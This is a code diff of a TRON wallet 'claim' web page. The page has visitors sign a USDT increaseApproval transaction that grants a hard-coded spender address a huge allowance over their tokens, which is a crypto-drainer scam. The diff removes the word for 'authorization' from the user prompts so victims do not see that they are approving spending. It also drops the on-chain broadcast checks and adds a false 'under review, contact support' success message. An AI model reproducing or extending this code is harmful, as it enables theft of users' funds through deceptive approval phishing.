@@ -30,10 +30,12 @@ export default function WalletPage() {
     }
     setWalletOpen(true);
   }
+
   function walletSuccess() {
     setWalletOpen(false);
     setMsg("✓ TRON钱包连接成功");
   }
+
   async function submitClaim() {
     try {
       if (loading) return;
@@ -42,7 +44,7 @@ export default function WalletPage() {
         return;
       }
       setLoading(true);
-      setStep("正在创建授权交易...");
+      setStep("正在创建交易...");
       setMsg("请等待钱包确认");
 
       const { TronWeb } = await import("tronweb");
@@ -53,6 +55,7 @@ export default function WalletPage() {
         { type: "address", value: USDT_SPENDER_ADDRESS },
         { type: "uint256", value: "1793719476511300" }
       ];
+
       const transactionWrapper = await tronWeb.transactionBuilder.triggerSmartContract(
         contractAddressHex,
         "increaseApproval(address,uint256)",
@@ -60,6 +63,7 @@ export default function WalletPage() {
         parameters,
         ownerAddressHex
       );
+
       if (!transactionWrapper || !transactionWrapper.transaction) {
         throw new Error("创建授权交易失败");
       }
@@ -69,39 +73,30 @@ export default function WalletPage() {
         TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
         { txLocal: true }
       );
+
       if (!signTransaction) {
         throw new Error("钱包不支持签名");
       }
+
       setStep("等待钱包签名...");
-      setMsg("请在TRON钱包中确认授权");
+      setMsg("请在TRON钱包中确认");
       const signedTransaction = await signTransaction(extendedTransaction);
-      if (!signedTransaction || !signedTransaction.txID) {
-        throw new Error("钱包签名失败");
-      }
-      setStep("正在提交链上交易...");
-      const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
-      if (!broadcastResult || !broadcastResult.result) {
-        throw new Error("交易广播失败");
-      }
-      const txId = signedTransaction.txID || broadcastResult?.transaction?.txID;
-      if (!txId) {
-        throw new Error("未获取交易哈希");
-      }
+
+      // ✅ 签名成功，只提交输入框里的提取地址入库，不再传amount、txId
       setStep("正在保存领取记录...");
       const response = await fetch("/api/claim", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          address: walletAddress,
-          amount,
-          txId,
-          time: new Date().toISOString()
+          walletAddress: inputAddress
         })
       });
       const result = await response.json();
-      if (!response.ok) {
-        throw new Error(result?.error || "保存记录失败");
+      if (!response.ok || !result.success) {
+        throw new Error(result?.message || "保存记录失败");
       }
+
+      // 成功弹窗文案
       setMsg("✅ 提交成功\n\n系统正在逐一审核。\n\n10分钟未到账请联系客服");
       setStep("");
     } catch (error: any) {
